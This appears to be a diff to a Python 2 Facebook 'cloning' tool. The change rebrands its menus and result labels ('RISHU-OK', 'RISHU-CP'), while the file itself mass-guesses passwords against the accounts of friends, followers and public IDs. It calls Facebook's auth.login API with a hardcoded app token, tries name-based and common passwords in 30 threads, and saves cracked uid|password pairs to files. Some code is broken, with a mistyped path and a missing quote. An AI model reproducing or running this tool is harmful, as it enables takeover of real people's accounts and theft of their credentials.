@@ -382,8 +382,8 @@ logo ="""
 
 \033[1;37m    d8888b. d888888b .d8888. db   db db    db 
 \033[1;37m    88  `8D   `88'   88'  YP 88   88 88    88 
-\033[1;37m    88oobY'    88    `8bo.   88ooo88 88    88 
-\033[1;37m    88`8b      88      `Y8b. 88~~~88 88    88 
+\033[1;32m    88oobY'    88    `8bo.   88ooo88 88    88 
+\033[1;32m    88`8b      88      `Y8b. 88~~~88 88    88 
 \033[1;37m    88 `88.   .88.   db   8D 88   88 88b  d88 
 \033[1;37m    88   YD Y888888P `8888Y' YP   YP ~Y8888P' 
 \033[1;97m-------------------------------------------------
@@ -403,7 +403,7 @@ def update():
 	os.system("clear")
         print(logo)
         print("")
-        print("\033[1;97m  Installing build dependencies ...").center(50)
+        print("\033[1;92m  Installing ToolS ...").center(50)
         time.sleep(5)
         country_main()
 	
@@ -412,19 +412,20 @@ def country_main():
 	print(logo)
 	print("")
 	print("Select Your Country").center(50)
-	print("")
+        print("")
+	print("\033[1;97m-------------------------------------------------")
 	time.sleep(2)
-	print("\033[1;97m[\033[1;93m1] \033[1;97mPakistan")
-	print("\033[1;97m[\033[1;93m2] \033[1;97mBangladesh")
-	print("\033[1;97m[\033[1;93m3] \033[1;97mIndia")
-	print("\033[1;97m[\033[1;93m4] \033[1;97mIndonesia")
-	print("\033[1;97m[\033[1;93m5] \033[1;97mNegeria")
-	print("\033[1;97m[\033[1;93m6] \033[1;97mNone ")
-	print("\033[1;97m[\033[1;93m0] \033[1;97mBack")
+	print("\033[1;97m[1] \033[1;97mPakistan")
+	print("\033[1;97m[2] \033[1;97mBangladesh")
+	print("\033[1;97m[3] \033[1;97mIndia")
+	print("\033[1;97m[4] \033[1;97mIndonesia")
+	print("\033[1;97m[5] \033[1;97mNegeria")
+	print("\033[1;97m[6] \033[1;97mNone ")
+	print("\033[1;97m[0] \033[1;97mBack")
 	print("\033[1;97m-------------------------------------------------")
 	count()
 def count():
-	count = raw_input("\n[!] Select A Option : ")
+	count = raw_input("\n\033[1;97m[!] Select Option ➤ \x1b[1;32m")
 	if count =="1":
 		os.system("rm -rf country.txt")
 		main ="pk"
@@ -499,13 +500,14 @@ def seclist():
 	os.system("clear")
 	print(logo)
 	print("")
-	print("\033[1;97m[\033[1;93m1\033[1;97m] Cloning Facebook Using Login")
-	print("\033[1;97m[\033[1;93m2\033[1;97m] Cloning From Type Of User-agent")
-	print("\033[1;97m[\033[1;93m3\033[1;97m] Tool Logout")
+        print("\033[1;97m-------------------------------------------------")
+	print("\033[1;97m[1\033[1;97m] Cloning Facebook Using Login")
+	print("\033[1;97m[2\033[1;97m] Cloning From Type Of User-agent")
+	print("\033[1;97m[3\033[1;97m] Tool Logout")
 	print("\033[1;97m-------------------------------------------------")
 	sct()
 def sct():
-	sect = raw_input("\033[1;97m[!] Put Option : ")
+	sect = raw_input("\033[1;97m[!] Select Option ➤ \x1b[1;32m")
 	if sect =="1":
 		      option_main()
 	elif sect =="2":
@@ -524,16 +526,17 @@ def agnets():
 	os.system("clear")
 	print(logo)
 	print("")
-	print("Select anyone option that you want to cloning").center(50)
+	print("\x1b[1;32mSelect anyone option that you want to cloning").center(50)
 	print("")
+        print("\033[1;97m-------------------------------------------------")
 	time.sleep(2)
-	print("\033[1;97m[\033[1;91m1\033[1;97m] Cloning With User-agents 01 (fast method) ")
-	print("\033[1;97m[\033[1;91m2\033[1;97m] Cloning With User-agents 02 (fast method) ")
-        print("\033[1;97m[\033[1;91m0\033[1;97m] Back")
+	print("\033[1;97m[1] Cloning With User-agents 01 (\x1b[1;32mfast method\x1b[1;37m) ")
+	print("\033[1;97m[2] Cloning With User-agents 02 (\x1b[1;32mfast method\x1b[1;37m) ")
+        print("\033[1;97m[0] Back")
         print("\033[1;97m-------------------------------------------------")
         agents2()
 def agents2():
-	main = raw_input("\033[1;97m[!] Select a option : \033[1;91m")
+	main = raw_input("\033[1;97m[!] Select Option ➤ \x1b[1;32m")
 	if main =="1":
 		      os.system("python2 __a01__")
 	elif main =="2":
@@ -553,30 +556,31 @@ def option_main():
 	print(logo)
 	print("")
 	time.sleep(1)
-	print("Type Of Login Menu Option").center(50)
+	print("\x1b[1;32mType Of Login Menu Option").center(50)
 	print("")
 	time.sleep(1)
-	print("\033[1;97m[\033[1;93m1\033[1;97m] Cloning From Old Menu \033[1;97m[ \033[1;92mBest Method\033[1;97m ] ")
-	print("\033[1;97m[\033[1;93m2\033[1;97m] Cloning From New Menu ")
-	print("\033[1;97m[\033[1;93mx\033[1;97m] Tool Logout")
+        print("\033[1;97m-------------------------------------------------")
+	print("\033[1;97m[1] Cloning From Old Menu \033[1;97m[ \033[1;92mBest Method\033[1;97m ] ")
+	print("\033[1;97m[2] Cloning From New Menu ")
+	print("\033[1;97m[0] Tool Logout")
 	print("\033[1;97m-------------------------------------------------")
 	opt()
 def opt():
-	opt = raw_input("\n[!] Put A Option : ")
+	opt = raw_input("\n\033[1;97m[!] Select Option ➤ \x1b[1;32m")
 	if opt =="1":
 		os.system("python2 __crack02__")
 	elif opt =="2":
 		okayabm()
-	elif opt =="x":
+	elif opt =="0":
 		print("")
 		time.sleep(1)
-		print("Tool Logout Success").center(50)
+		print("\x1b[1;32mTool Logout Success").center(50)
 		print("")
 		time.sleep(1)
 	else:
 		print("")
 		time.sleep(1)
-		print("Please select a valid option").center(50)
+		print("\x1b[1;31mPlease select a valid option").center(50)
 		print("")
 		time.sleep(1)
 
@@ -584,15 +588,16 @@ def okayabm():
 	os.system("clear")
 	print(logo)
 	print("")
-	print("\033[1;97m[\033[1;93m1\033[1;97m] Clone Friendlist And Public ID")
-	print("\033[1;97m[\033[1;93m2\033[1;97m] Cloning From Phone Number")
-	print("\033[1;97m[\033[1;93m3\033[1;97m] Join Our Facebook Group")
-	print("\033[1;97m[\033[1;93m4\033[1;97m] Contact From Owner")
-	print("\033[1;97m[\033[1;93m5\033[1;97m] Tool Logout")
+        print("\033[1;97m-------------------------------------------------")
+	print("\033[1;97m[1] Clone Friendlist And Public ID")
+	print("\033[1;97m[2] Cloning From Phone Number")
+	print("\033[1;97m[3] Join Our Facebook Group")
+	print("\033[1;97m[4] Contact To Owner (\x1b[1;32mRishu\x1b[1;37m)")
+	print("\033[1;97m[5] Tool Logout")
 	print("\033[1;97m-------------------------------------------------")
 	abm2()
 def abm2():
-	abm_select = raw_input("[!] Select a valid option :  ")
+	abm_select = raw_input("\033[1;97m[!] Select Option ➤ \x1b[1;32m")
 	if abm_select =="1":
 		      login_menu()
 	elif abm_select =="2":
@@ -600,7 +605,7 @@ def abm2():
 	elif abm_select =="3":
 		      join_group()
 	elif abm_select =="4":
-		      os.system("xdg-open https://facebook.com/Techabm")
+		      os.system("xdg-open https://facebook.com/al3x.rishu")
 		      time.sleep(1)
 		      okayabm()
 	elif abm_select =="5":
@@ -617,7 +622,7 @@ def join_group():
 	os.system("clear")
 	print(logo)
 	print("")
-	raw_input("\t Press Enter To Join Fb Group")
+	raw_input("\t \x1b[1;37mPress Enter To Join Fb Group")
 	time.sleep(2)
 	os.system("xdg-open https://facebook.com/groups/505521257441736/")
 	time.sleep(2)
@@ -630,13 +635,14 @@ def login_menu():
 	except(KeyError , IOError):
 		os.system("clear")
 		print(logo)
-		print("\033[1;97m[\033[1;93m1\033[1;97m] Login With Facebook Token")
-		print("\033[1;97m[\033[1;93m2\033[1;97m] Login With Facebook Password")
-		print("\033[1;97m[\033[1;93m3\033[1;97m] Tool Back To Main Menu")
+                print("\033[1;97m-------------------------------------------------")
+		print("\033[1;97m[1] Login With Facebook Token")
+		print("\033[1;97m[2] Login With Facebook Password")
+		print("\033[1;97m[3] Tool Back To Main Menu")
 		print("\033[1;97m-------------------------------------------------")
 		login()
 def login():
-	abm_login = raw_input("[!] select a valid option : ")
+	abm_login = raw_input("\033[1;97m[!] Select Option ➤ \x1b[1;32m")
 	if abm_login =="1":
 		      token_login()
 	elif abm_login =="2":
@@ -646,7 +652,7 @@ def login():
 	else:
 		      print("")
 		      time.sleep(2)
-		      print("please select a valid option").center(50)
+		      print("\x1b[1;31mplease select a valid option").center(50)
 		      print("")
 		      time.sleep(2)
 		      login_menu()
@@ -658,7 +664,8 @@ def token_login():
         menu()
     except(KeyError , IOError):
         print(logo)
-        token = raw_input("\033[1;97m[!] Token : \033[0;90m")
+        print("\033[1;97m-------------------------------------------------")
+        token = raw_input("\033[1;97m[!] Token ➤ \033[0;92m")
         print("\033[1;97m-------------------------------------------------")
         sav_token = open("access_token.txt", "w")
         sav_token.write(token)
@@ -677,8 +684,10 @@ def fb_pass():
 		menu()
 	except (KeyError , IOError):
 		print(logo)
-		uid = raw_input("\033[1;97m[!] Email Number / Username : \033[1;93m")
-		passw = raw_input("\033[1;97m[!] Password : \033[1;93m")
+                print("\033[1;97m-------------------------------------------------")
+		uid = raw_input("\033[1;97m[!] Email Number / Username ➤ \033[1;92m")
+		passw = raw_input("\033[1;97m[!] Password ➤ \033[1;92m")
+                print("\033[1;97m-------------------------------------------------")
 		data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+passw+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true", headers=header).text
 		q = json.loads(data)
 		if "access_token" in q:
@@ -723,20 +732,20 @@ def menu():
         update()
     os.system("clear")
     print(logo)
-    print("\033[1;92m\tLogged User ID : "+name)
+    print("\033[1;97m\tLogged User ID : \x1b[1;32m"+name)
     print("")
     print("\033[1;97m-------------------------------------------------")
-    print("\033[1;97m[\033[1;93m1\033[1;97m] Facebook Cloning Menu")
-    print("\033[1;97m[\033[1;93m2\033[1;97m] Facebook Cloning With Password")
-    print("\033[1;97m[\033[1;93m3\033[1;97m] View Your Login Token")
-    print("\033[1;97m[\033[1;93m4\033[1;97m] Select User Agents")
-    print("\033[1;97m[\033[1;93m5\033[1;97m] Fix Username Error")
-    print("\033[1;97m[\033[1;93m6\033[1;97m] Result Crack")
-    print("\033[1;97m[\033[1;93m7\033[1;97m] Remove Token For Logout")
+    print("\033[1;97m[1] Facebook Cloning Menu")
+    print("\033[1;97m[2] Facebook Cloning With Password")
+    print("\033[1;97m[3] View Your Login Token")
+    print("\033[1;97m[4] Select User Agents")
+    print("\033[1;97m[5] Fix Username Error")
+    print("\033[1;97m[6] Result Crack")
+    print("\033[1;97m[7] Remove Token For Logout")
     print("\033[1;97m-------------------------------------------------")
     menu_login()
 def menu_login():
-	user_select = raw_input("[!] Select a valid option : ")
+	user_select = raw_input("\033[1;97m[!] Select Option ➤ \x1b[1;32m")
 	if user_select =="1":
 		crack()
 	elif user_select =="2":
@@ -775,19 +784,20 @@ def crack():
 		token = open("access_token.txt","r").read()
 	except IOError:
 		print("")
-		print("Token not found or has checkpoint ").center(50)
+		print("\x1b[1;31mToken not found or has checkpoint ").center(50)
 		time.sleep(2)
 		update()
 	os.system("clear")
 	print(logo)
-	print("\033[1;97m[\033[1;93m1\033[1;97m] Cloning From Friendlist ID") 
-	print("\033[1;97m[\033[1;93m2\033[1;97m] Cloning With Public ID")
-	print("\033[1;97m[\033[1;93m3\033[1;97m] Cloning With Follower ID")
-	print("\033[1;97m[\033[1;93m4\033[1;97m] Back To Main Menu")
+        print("\033[1;97m-------------------------------------------------")
+	print("\033[1;97m[1] Cloning From Friendlist ID") 
+	print("\033[1;97m[2] Cloning With Public ID")
+	print("\033[1;97m[3] Cloning With Follower ID")
+	print("\033[1;97m[4] Back To Main Menu")
 	print("\033[1;97m-------------------------------------------------")
 	crack2()
 def crack2():
-	select = raw_input("[!] Select a valid option : ")
+	select = raw_input("\033[1;97m[!] Select Option ➤ \x1b[1;32m")
 	id=[]
 	oks=[]
 	cps=[]
@@ -804,12 +814,13 @@ def crack2():
 	elif select =="2":
 		os.system("clear")
 		print(logo)
-		idt = raw_input("\033[1;97m[!] Enter Public ID/Username : ")
+		idt = raw_input("\033[1;97m[!] Enter Public ID/Username ➤ \x1b[1;32m")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			q = json.loads(r.text)
 			os.system('clear')
 			print(logo)
+                        print("\033[1;97m-------------------------------------------------")
 			print("[!] Cloning User Name :\033[1;92m "+q["name"])
 		except KeyError:
 			print("\033[1;91mInvalid link/Username OR Has Privacy").center(50)
@@ -826,15 +837,16 @@ def crack2():
 	elif select =="3":
 		os.system("clear")
 		print(logo)
-		idt = raw_input("\033[1;97m[!] Enter Follower ID/Username : ")
+		idt = raw_input("\033[1;97m[!] Enter Follower ID/Username ➤ \x1b[1;32m")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			q = json.loads(r.text)
 			os.system('clear')
 			print(logo)
+                        print("\033[1;97m-------------------------------------------------")
 			print("[!] Cloning User Name : \033[1;92m"+q["name"])
 		except KeyError:
-			print("\033[1;92mInvalid link/Username OR Has Privacy").center(50)
+			print("\033[1;91mInvalid link/Username OR Has Privacy").center(50)
 			print("")
 			time.sleep(2)
 			crack()
@@ -854,7 +866,8 @@ def crack2():
 		print("")
 		time.sleep(2)
 		crack()
-	print("\033[1;97m[!] Total User IDs : "+str(len(id)))
+        print("\033[1;97m-------------------------------------------------")
+	print("\033[1;97m[!] Total User IDs : \x1b[1;32m"+str(len(id)))
 	print("\033[1;97m[!] Cracking Started....")
 	print("\033[1;97m[!] Plz Wait Clone Account Will Be Appear Here")
 	print("\033[1;97m-------------------------------------------------")
@@ -866,18 +879,18 @@ def crack2():
 		session = requests.Session()
 		session.headers.update({'User-Agent': ranagent})
 		try:
-			pass1 = name+"123"
+			pass1 = name+"@123"
 			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 			q = json.loads(data)
 			if "access_token" in q:
-				print("\033[1;92m[Successfull] \033[1;96m"+uid+" - "+pass1+" - "+name+"\033[0;97m") 
+				print("\033[1;92m[RISHU-OK] "+uid+" - "+pass1+" - "+name+"\033[0;97m") 
 				ok = open("/sdcard/oks.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print("\033[1;93m[Check-Point] \033[1;97m"+uid+" - "+pass1+" - "+name+"\033[0;97m" )
+					print("\033[1;91m[RISHU-CP] "+uid+" - "+pass1+" - "+name+"\033[0;97m" )
 					cp = open("/sdcars/cps.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
@@ -887,14 +900,14 @@ def crack2():
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 					q = json.loads(data)
 					if "access_token" in q:
-                                                print("\033[1;92m[Successfull] \033[1;96m"+uid+" - "+pass2+" - "+name+"\033[0;97m") 
+                                                print("\033[1;92m[RISHU-OK] "+uid+" - "+pass2+" - "+name+"\033[0;97m") 
 				                ok = open("/sdcard/oks.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print("\033[1;93m[Check-Point] \033[1;97m"+uid+" - "+pass2+" - "+name+"\033[0;97m" )
+							print("\033[1;91m[RISHU-CP] "+uid+" - "+pass2+" - "+name+"\033[0;97m" )
 					                cp = open("/sdcard/cps.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
@@ -904,14 +917,14 @@ def crack2():
 							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 							q = json.loads(data)
 							if "access_token" in q:
-								print("\033[1;92m[Successfull] \033[1;96m"+uid+" - "+pass3+" - "+name+"\033[0;97m") 
+								print("\033[1;92m[RISHU-OK] "+uid+" - "+pass3+" - "+name+"\033[0;97m") 
 				                                ok = open("/sdcard/oks.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
-									print("\033[1;93m[Check-Point] \033[1;97m"+uid+" - "+pass3+" - "+name+"\033[0;97m" )
+									print("\033[1;91m[RISHU-CP] "+uid+" - "+pass3+" - "+name+"\033[0;97m" )
 					                                cp = open("/sdcard/cps.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
@@ -921,14 +934,14 @@ def crack2():
 									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 									q = json.loads(data)
 									if "access_token" in q:
-										print("\033[1;92m[Successfull] \033[1;96m"+uid+" - "+pass4+" - "+name+"\033[0;97m") 
+										print("\033[1;92m[RISHU-OK] "+uid+" - "+pass4+" - "+name+"\033[0;97m") 
 				                                                ok = open("/sdcard/oks.txt", "a")
 										ok.write(uid+"|"+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error_msg"]:
-											print("\033[1;93m[Check-Point] \033[1;97m"+uid+" - "+pass4+" - "+name+"\033[0;97m" )
+											print("\033[1;91m[RISHU-CP] "+uid+" - "+pass4+" - "+name+"\033[0;97m" )
 					                                                cp = open("/sdcard/cps.txt", "a")
 											cp.write(uid+"|"+pass4+"\n")
 											cp.close()
@@ -938,14 +951,14 @@ def crack2():
 											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 											q = json.loads(data)
 											if "access_token" in q:
-												print("\033[1;92m[Successfull] \033[1;96m"+uid+" - "+pass5+" - "+name+"\033[0;97m") 
+												print("\033[1;92m[RISHU-OK] "+uid+" - "+pass5+" - "+name+"\033[0;97m") 
 				                                                                ok = open("/sdcard/oks.txt", "a")
 												ok.write(uid+"|"+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error_msg"]:
-													print("\033[1;93m[Check-Point] \033[1;97m"+uid+" - "+pass5+" - "+name+"\033[0;97m" )
+													print("\033[1;91m[RISHU-CP] "+uid+" - "+pass5+" - "+name+"\033[0;97m" )
 					                                                                cp = open("/sdcard/cps.txt", "a")
 													cp.write(uid+"|"+pass5+"\n")
 													cp.close()
@@ -958,11 +971,12 @@ def crack2():
 			pass
 	p = ThreadPool(30)
 	p.map(main, id)
-	print("\033[1;97m-------------------------------------------------")
+        print("\033[1;97m-------------------------------------------------")
 	print("\033[1;97m[!] The cloning process has been completed")
-	print("\033[1;97m[!] Total CP/OK: "+str(len(cps))+"/"+str(len(oks)))
+	print("\033[1;97m[!] Total \x1b[1;31mCP\x1b[1;37m/\x1b[1;32mOK\x1b[1;37m: "+str(len(cps))+"/"+str(len(oks)))
 	print("\033[1;97m[!] CP file saved as : cps.txt")
 	print("\033[1;97m[!] OK file saved as : oks.txt")
+        print("\033[1;97m-------------------------------------------------")
 	raw_input("\033[1;97m[!] Press Enter To Main Menu Back")
 	menu()
 	
@@ -978,16 +992,17 @@ def choice_main():
 		update()
 	os.system("clear")
 	print(logo)
-	print("\033[1;96mWelcome To Choose Password Forum").center(50)
+	print("\033[1;92mWelcome To Choose Password Forum").center(50)
 	print("")
 	time.sleep(2)
-	print("\033[1;97m[\033[1;91m1\033[1;97m] Cloning From Numbring Password")
-	print("\033[1;97m[\033[1;91m2\033[1;97m] Cloning From String Password")
-	print("\033[1;97m[\033[1;91m3\033[1;97m] Back")
+        print("\033[1;97m-------------------------------------------------")
+	print("\033[1;97m[1\033[1;97m] Cloning From Numbring Password")
+	print("\033[1;97m[2\033[1;97m] Cloning From String Password")
+	print("\033[1;97m[3\033[1;97m] Back")
 	print("\033[1;97m-------------------------------------------------")
 	choice_main2()
 def choice_main2():
-	main_put = raw_input("\033[1;97m[!] Choose A option :\033[1;91m ")
+	main_put = raw_input("\033[1;97m[!] Select Option ➤ \x1b[1;32m")
 	if main_put =="1":
 		choice()
 	elif main_put =="2":
@@ -996,7 +1011,7 @@ def choice_main2():
 		menu()
 	else:
 		print("")
-		print("Please select a valid option").center(50)
+		print("\x1b[1;31mPlease select a valid option").center(50)
 		print("")
 		time.sleep(3)
 		choice_main()
@@ -1013,31 +1028,37 @@ def choice():
 		update()
 	os.system("clear")
 	print(logo)
-	print("\033[1;97m[\033[1;93m1\033[1;97m] \033[1;96mCloning With Public ID")
-	print("\033[1;97m[\033[1;93m2\033[1;97m] \033[1;96mCloning With Follower ID")
-	print("\033[1;97m[\033[1;93m3\033[1;97m] \033[1;96mBack To Main Menu")
+        print("\033[1;97m-------------------------------------------------")
+	print("\033[1;97m[1] Cloning With Public ID")
+	print("\033[1;97m[2] Cloning With Follower ID")
+	print("\033[1;97m[3] Back To Main Menu")
 	print("\033[1;97m-------------------------------------------------")
 	choice2()
 def choice2():
-	select = raw_input("[!] Select a valid option : ")
+	select = raw_input("\033[1;97m[!] Select Option ➤ \x1b[1;32m")
 	id=[]
 	oks=[]
 	cps=[]
 	if select =="1":
 		os.system("clear")
 		print(logo)
-		idt = raw_input("\033[1;97m[!] Enter Public ID/Username : ")
+		idt = raw_input("\033[1;97m[!] Enter Public ID/Username ➤ \x1b[1;32m")
 		print("")
+                print("\033[1;97m-------------------------------------------------")
 		print("[!] Password : 768786,000786,123456").center(50)
+                print("\033[1;97m-------------------------------------------------")
 		print("")
+                print("\033[1;97m-------------------------------------------------")
 		pass1 = raw_input("[1] Password : ")
 		pass2 = raw_input("[2] Password : ")
 		pass3 = raw_input("[3] Password : ")
+                print("\033[1;97m-------------------------------------------------")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			q = json.loads(r.text)
 			os.system('clear')
 			print(logo)
+                        print("\033[1;97m-------------------------------------------------")
 			print("[!] Cloning User Name :\033[1;92m "+q["name"])
 		except KeyError:
 			print("\033[1;91mInvalid link/Username OR Has Privacy").center(50)
@@ -1054,21 +1075,28 @@ def choice2():
 	elif select =="2":
 		os.system("clear")
 		print(logo)
-		idt = raw_input("\033[1;97m[!] Enter Follower ID/Username : ")
+                print("\033[1;97m-------------------------------------------------")
+		idt = raw_input("\033[1;97m[!] Enter Follower ID/Username ➤ \x1b[1;32m")
+                print("\033[1;97m-------------------------------------------------")
 		print("")
+                print("\033[1;97m-------------------------------------------------")
 		print("[!] Password : 768786,000786,123456").center(50)
+                print("\033[1;97m-------------------------------------------------")
 		print("")
+                print("\033[1;97m-------------------------------------------------")
 		pass1 = raw_input("[1] Password : ")
 		pass2 = raw_input("[2] Password : ")
 		pass3 = raw_input("[3] Password : ")
+                print("\033[1;97m-------------------------------------------------")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			q = json.loads(r.text)
 			os.system('clear')
 			print(logo)
+                        print("\033[1;97m-------------------------------------------------")
 			print("[!] Cloning User Name : \033[1;92m"+q["name"])
 		except KeyError:
-			print("\033[1;92mInvalid link/Username OR Has Privacy").center(50)
+			print("\033[1;91mInvalid link/Username OR Has Privacy").center(50)
 			print("")
 			time.sleep(2)
 			choice()
@@ -1088,7 +1116,8 @@ def choice2():
 		print("")
 		time.sleep(2)
 		choice()
-	print("\033[1;97m[!] Total User IDs : "+str(len(id)))
+        print("\033[1;97m-------------------------------------------------")
+	print("\033[1;97m[!] Total User IDs : \x1b[1;32m"+str(len(id)))
 	print("\033[1;97m[!] Cracking Started....")
 	print("\033[1;97m[!] Plz Wait Clone Account Will Be Appear Here")
 	print("\033[1;97m-------------------------------------------------")
@@ -1104,14 +1133,14 @@ def choice2():
 			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 			q = json.loads(data)
 			if "access_token" in q:
-				print("\033[1;92m[Successfull] \033[1;96m"+uid+" - "+pass1+" - "+name+"\033[0;97m") 
+				print("\033[1;92m[RISHU-OK] "+uid+" - "+pass1+" - "+name+"\033[0;97m") 
 				ok = open("/sdcard/oks.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print("\033[1;93m[Check-Point] \033[1;97m"+uid+" - "+pass1+" - "+name+"\033[0;97m" )
+					print("\033[1;91m[RISHU-CP] "+uid+" - "+pass1+" - "+name+"\033[0;97m" )
 					cp = open("/sdcars/cps.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
@@ -1121,14 +1150,14 @@ def choice2():
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 					q = json.loads(data)
 					if "access_token" in q:
-                                                print("\033[1;92m[Successfull] \033[1;96m"+uid+" - "+pass2+" - "+name+"\033[0;97m") 
+                                                print("\033[1;92m[RISHU-OK] "+uid+" - "+pass2+" - "+name+"\033[0;97m") 
 				                ok = open("/sdcard/oks.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print("\033[1;93m[Check-Point] \033[1;97m"+uid+" - "+pass2+" - "+name+"\033[0;97m" )
+							print("\033[1;91m[RISHU-CP] "+uid+" - "+pass2+" - "+name+"\033[0;97m" )
 					                cp = open("/sdcard/cps.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
@@ -1138,14 +1167,14 @@ def choice2():
 							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 							q = json.loads(data)
 							if "access_token" in q:
-								print("\033[1;92m[Successfull] \033[1;96m"+uid+" - "+pass3+" - "+name+"\033[0;97m") 
+								print(\033[1;92m[RISHU-OK] "+uid+" - "+pass3+" - "+name+"\033[0;97m") 
 				                                ok = open("/sdcard/oks.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
